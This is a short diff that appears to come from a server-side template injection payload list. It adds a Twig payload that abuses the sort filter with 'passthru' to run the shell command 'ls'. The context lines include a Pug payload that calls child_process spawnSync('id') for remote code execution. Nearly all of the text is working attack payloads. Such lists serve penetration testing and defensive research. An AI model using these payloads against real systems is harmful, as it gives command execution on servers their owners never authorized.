@@ -9,6 +9,8 @@
 # twig
 {{7*7}}
 
+{{ ["ls",""] | sort("passthru")}}
+
 # Jade/Pug (Node.js)
 #{7*7}
 #{root.process.mainModule.require("child_process").spawnSync("id").stdout}
